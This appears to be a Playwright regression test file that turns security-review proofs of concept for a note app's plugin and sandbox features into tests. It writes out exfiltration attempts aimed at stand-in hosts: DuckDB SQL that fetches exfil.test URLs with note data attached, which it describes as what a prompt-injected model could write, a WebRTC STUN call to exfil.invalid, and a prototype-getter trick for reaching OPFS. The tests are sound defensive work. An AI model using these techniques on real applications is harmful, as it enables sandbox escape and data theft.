import { expect, test, type Page } from '@playwright/test';
import { modKey, newNote, openApp, pointer } from './helpers.ts';

/**
 * Proofs of concept from the security review (docs/SECURITY_REVIEW.md), kept as regression
 * tests: each one is the attack, and passes only while the fix holds.
 */

const SLOW = { timeout: 15_000 };

/** Writes files into the vault the way a sync, a paired device or a restored backup would. */
async function writeVault(page: Page, files: Record<string, string>) {
  await page.waitForFunction(() => !!(window as any).__inkwrightHub?.vault?.fs, null, SLOW);
  await page.evaluate(async (files) => {
    const fs = (window as any).__inkwrightHub.vault.fs;
    for (const [path, text] of Object.entries(files)) await fs.writeText(path, text);
  }, files);
}

/** What the plugin stored when it ran (null: it never ran). */
async function ran(page: Page, id: string): Promise<string | null> {
  return page.evaluate(async (id) => {
    const text = await (window as any).__inkwrightHub?.vault?.fs.readText(`plugins/${id}/data.json`);
    return text ? JSON.parse(text).storage?.ran ?? null : null;
  }, id);
}

test('SR-01: a plugin that arrives with the vault does not run until it is reviewed on this device', async ({ page }) => {
  const id = 'test.arrived';
  const manifest = {
    id, name: 'Arrived', version: '1.0.0', author: 'Someone else', description: 'Came with a sync.', minAppVersion: '1.0.0',
    permissions: ['notes:read', 'network'], network: { hosts: ['https://exfil.test'] }, activation: 'startup', contributes: {},
  };
  // What an attacker's plugin would do: read every note and send it away. Here it only announces itself.
  const code = `export default { async activate(inkwright) { await inkwright.storage.set('ran', 'v1'); } };`;
  const config = { formatVersion: 1, plugins: [{ id, version: '1.0.0', enabled: true, granted: ['notes:read', 'network'], source: { kind: 'folder', name: id }, installedAt: 1, updatedAt: 1 }] };

  await openApp(page);
  await writeVault(page, {
    [`plugins/${id}/manifest.json`]: JSON.stringify(manifest),
    [`plugins/${id}/main.js`]: code,
    'plugins/plugins.json': JSON.stringify(config),
  });
  await page.reload();
  await expect(page.locator('.library')).toBeVisible();
  // Give a startup plugin ample time to run; it must not.
  await page.waitForTimeout(3000);
  expect(await ran(page, id)).toBeNull();

  // Settings › Plugins says why, and offers a review.
  await page.goto('/?e2e#settings/plugins');
  await page.locator('.set-nav .nav-item', { hasText: 'Plugins' }).click();
  const card = page.locator('.plg-card', { hasText: 'Arrived' });
  await expect(card).toContainText('Review it to run it here');
  await card.getByRole('button', { name: 'Review' }).click();
  const dialog = page.getByRole('dialog', { name: 'Allow Arrived on this device?' });
  await expect(dialog).toContainText('Connect to the internet');
  await dialog.getByRole('button', { name: 'Allow' }).click();
  await expect.poll(() => ran(page, id), SLOW).toBe('v1');

  // Changing its code elsewhere (a sync bringing a different main.js) needs a new review.
  await writeVault(page, { [`plugins/${id}/main.js`]: code.replace("'v1'", "'v2'") });
  await page.reload();
  await page.locator('.set-nav .nav-item', { hasText: 'Plugins' }).click();
  await expect(page.locator('.plg-card', { hasText: 'Arrived' })).toContainText('Review it to run it here', SLOW);
  await page.waitForTimeout(2000);
  expect(await ran(page, id)).toBe('v1');
});

test('SR-05: a runbook js block cannot reach the origin private file system', async ({ page }) => {
  await openApp(page);
  await newNote(page);
  await page.keyboard.press('t');
  await pointer(page, 'pointerdown', [220, 240], { type: 'mouse' });
  await pointer(page, 'pointerup', [220, 240], { type: 'mouse' });
  const ta = page.locator('.text-area');
  await expect(ta).toBeVisible();
  // The navigator.storage getter lives on WorkerNavigator.prototype: shadowing it on the
  // instance was not enough to take OPFS (same origin as the app) away from the block.
  await ta.fill([
    '```js',
    "const d = Object.getOwnPropertyDescriptor(WorkerNavigator.prototype, 'storage');",
    'const s = d && d.get ? d.get.call(navigator) : undefined;',
    "return { storage: typeof s, opfs: typeof (s && s.getDirectory), locks: typeof navigator.locks };",
    '```',
  ].join('\n'));
  await page.getByRole('button', { name: 'Done' }).click();
  await page.getByRole('button', { name: 'Run js block' }).click();
  const body = page.getByRole('region', { name: 'Run result' }).locator('.dev-body');
  await expect(body).toContainText('"storage": "undefined"', SLOW);
  await expect(body).toContainText('"opfs": "undefined"');
});

test('SR-12: a plugin without the network permission cannot open a WebRTC connection', async ({ page }) => {
  // connect-src doesn't cover WebRTC: before the fix a plugin could reach a STUN/TURN server of
  // its choosing (and leak through its DNS name) with no network permission at all.
  const code = `export default { activate(inkwright) {
    inkwright.commands.register('probe', async () => {
      let offer = 'not tried';
      try {
        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:exfil.invalid:3478' }] });
        pc.createDataChannel('x');
        await pc.setLocalDescription(await pc.createOffer());
        offer = 'offer made';
      } catch (e) { offer = 'refused'; }
      await inkwright.ui.toast(['rtc', typeof window.RTCPeerConnection, typeof window.webkitRTCPeerConnection, typeof window.RTCDataChannel, offer].join(' '));
    });
  } };`;
  const manifest = { id: 'test.rtc', name: 'RTC probe', version: '1.0.0', author: 'Tests', description: 'Tries WebRTC.', minAppVersion: '1.0.0', permissions: [], contributes: { commands: [{ id: 'probe', title: 'Probe WebRTC' }] } };
  await page.route('https://plugins.test/rtc/**', (r) => {
    const name = new URL(r.request().url()).pathname.split('/').pop();
    if (name === 'manifest.json') return r.fulfill({ contentType: 'application/json', body: JSON.stringify(manifest), headers: { 'access-control-allow-origin': '*' } });
    if (name === 'main.js') return r.fulfill({ contentType: 'text/javascript', body: code, headers: { 'access-control-allow-origin': '*' } });
    return r.fulfill({ status: 404, body: '' });
  });
  await openApp(page);
  await page.goto('/?e2e#settings/plugins');
  await page.locator('.set-nav .nav-item', { hasText: 'Plugins' }).click();
  await page.getByLabel('Link to a plugin (its manifest.json, folder or .zip)').fill('https://plugins.test/rtc/');
  await page.locator('form.plg-url').getByRole('button', { name: 'Install' }).click();
  await page.getByRole('dialog', { name: 'Install RTC probe?' }).getByRole('button', { name: 'Install' }).click();
  await openApp(page);
  await newNote(page);
  await page.keyboard.press(`${await modKey(page)}+k`);
  await page.locator('.pal-input').fill('probe webrtc');
  await page.getByText('Probe WebRTC', { exact: true }).first().click();
  await expect(page.locator('.toasts')).toContainText('rtc undefined undefined undefined refused', SLOW);
});

test('SR-02: SQL in the data sandbox cannot fetch URLs (no exfiltration through DuckDB)', async ({ page }) => {
  const hits: string[] = [];
  await page.context().route('https://exfil.test/**', (r) => {
    hits.push(r.request().url());
    return r.fulfill({ status: 200, contentType: 'text/csv', headers: { 'access-control-allow-origin': '*' }, body: 'got\nyes\n' });
  });
  await openApp(page);
  await newNote(page);
  await page.evaluate(() => {
    const el = document.querySelector('.ed-canvas')!;
    const dt = new DataTransfer();
    dt.items.add(new File(['region,amount\nNorth,10\nSouth,5\n'], 'sales.csv', { type: 'text/csv' }));
    const r = el.getBoundingClientRect();
    for (const type of ['dragenter', 'dragover', 'drop']) el.dispatchEvent(new DragEvent(type, { dataTransfer: dt, bubbles: true, cancelable: true, clientX: r.left + 200, clientY: r.top + 200 }));
  });
  await page.getByRole('button', { name: 'Query' }).click();
  const dlg = page.getByRole('dialog', { name: 'Data' });
  await expect(dlg).toContainText('Runs on this device in DuckDB', { timeout: 30_000 });
  // What a prompt-injected model could write (it sees sample rows): the read-only filter let
  // both forms through, and DuckDB fetched the URL from its worker.
  for (const sql of [
    "SELECT * FROM 'https://exfil.test/a.csv?d=North-10'",
    `SELECT * FROM "read_csv"('https://exfil.test/b.csv?d=South-5')`,
  ]) {
    await dlg.getByLabel('SQL').fill(sql);
    await dlg.getByRole('button', { name: 'Run' }).click();
    await expect(dlg.getByRole('alert')).toBeVisible(SLOW);
  }
  // The sandbox still answers real queries.
  await dlg.getByLabel('SQL').fill('SELECT sum(amount) AS total FROM sales');
  await dlg.getByRole('button', { name: 'Run' }).click();
  await expect(dlg.getByRole('table')).toContainText('15', SLOW);
  expect(hits).toEqual([]);
});
